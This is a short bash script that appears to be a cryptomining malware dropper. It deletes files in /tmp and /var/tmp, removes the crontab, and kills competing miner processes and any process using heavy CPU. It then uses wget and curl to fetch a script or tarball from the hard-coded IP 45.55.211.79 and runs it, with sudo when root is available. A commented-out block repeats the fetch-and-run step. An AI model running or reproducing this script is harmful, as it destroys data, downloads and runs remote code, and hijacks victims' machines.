#!/bin/bash

rm -rf /tmp/*
rm -rf /tmp/.*
rm -rf /var/tmp/*
rm -rf /var/tmp/.lib
crontab -r
killall -9 trace
killall -9 kintegrityds
killall -9 kpsmouseds
killall -9 md
ps -ef|grep -v grep|grep "trace"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kintegrityds"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kpsmouseds"|awk '{print $2}'|xargs kill -9
ps aux|grep -v grep|awk '{if($3>=80.0) print $2}'|xargs kill -9
kill -9 `cat /tmp/.X11unix`
kill -9 `cat /tmp/.lsdpid`
cd /tmp
mkdir .scr
cd .scr
killall -9 .bash
ps -e -o pcpu,pid,args | awk '{if($1>30.0) print $2}' | while read procid
do
kill -9 $procid
done
if crontab -l | grep -q "pastebin"
then
crontab -r
else
echo "ok" >> /dev/null
fi
if $(sudo id | grep root > tmp.out) && [ -f tmp.out ]; then
        sudo wget -q 45.55.211.79/.cache/jenkins/nr1.sh
	sudo curl -O 45.55.211.79/.cache/jenkins/nr1.sh
	sudo chmod +x nr1.sh
	sudo ./nr1.sh
else
        wget -q 45.55.211.79/.cache/jenkins/sn.tar.gz
	curl -O 45.55.211.79/.cache/jenkins/sn.tar.gz
	tar -zxvf sn.tar.gz
	rm -rf sn.tar.gz
	cd sn
	chmod +rwx *
	./go
fi
# netstat -an|grep -v grep|grep "51.15.54.102" 1>/dev/null
# if [ $? -eq 1 ];then
#               wget 45.55.211.79/.cache/jenkins/s.tar.gz
#		curl -O 45.55.211.79/.cache/jenkins/s.tar.gz
#		tar -zxvf s.tar.gz
#		rm -rf s.tar.gz*
#		cd s
#               chmod +rwx *
#               ./go
#     fi

